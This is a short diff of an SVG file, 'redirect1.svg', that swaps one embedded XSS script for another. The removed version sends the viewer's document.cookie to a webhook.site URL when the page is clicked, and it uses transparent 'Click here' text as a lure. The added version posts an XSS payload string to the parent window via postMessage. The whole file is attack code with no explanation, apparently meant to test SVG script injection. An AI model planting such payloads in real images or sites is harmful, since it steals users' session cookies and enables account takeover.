@@ -1,8 +1,9 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="300" height="100">
+<!-- redirect1.svg -->
+<svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    document.onclick = () => {
-      window.top.location = "https://webhook.site/dc178026-0966-4143-8ebd-d4ec82a2bd6f?cookie=" + document.cookie;
-    }
+    window.parent.postMessage({
+      type: "xss",
+      payload: "alert('🔥 XSS via postMessage from SVG!')"
+    }, "*");
   </script>
-  <text x="20" y="40" font-size="20" fill="transparent">Click here</text>
 </svg>
